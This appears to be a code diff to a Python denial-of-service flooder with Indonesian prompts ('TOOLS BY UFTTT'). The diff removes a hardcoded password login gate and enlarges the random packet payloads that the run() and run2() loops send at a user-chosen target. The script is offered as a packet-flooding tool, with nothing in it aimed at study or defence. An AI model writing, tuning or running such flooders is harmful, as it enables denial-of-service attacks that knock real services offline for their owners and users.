@@ -5,26 +5,7 @@ import threading
 import os
 import sys
 
-print("\033[91m ")
-password ='maestro'
-
 os.system("clear")
-for i in range(3):
-    pwd = input("[•] Enter Account : ")
-    j=3
-    if(pwd==password):
-        time.sleep(4)
-        print("[+] Wait A Moment!!! ")
-        break
-    else:
-        time.sleep(5)
-        print("[×] Wrong Account!!! ")
-        continue
-time.sleep(5)
-print("[@] Login Successful")
-time.sleep(5)
-
-
 print("""\033[91m
 
                   TOOLS BY UFTTT
@@ -50,7 +31,7 @@ choice = str(input(" LANJUT UNTUK MENDDOS? (y/n):"))
 times = int(input(" BERAPA PAKET DIKIRIM:"))
 threads = int(input(" ISI SETIAP PAKET:"))
 def run():
-	data = random._urandom(1000)
+	data = random._urandom(1025)
 	i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]"))
 	while True:
 		try:
@@ -63,7 +44,7 @@ def run():
 			print("[!] PAKETNYA ENAK GAK OM !!!")
 
 def run2():
-	data = random._urandom(16)
+	data = random._urandom(150)
 	i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]","[#]"))
 	while True:
 		try:
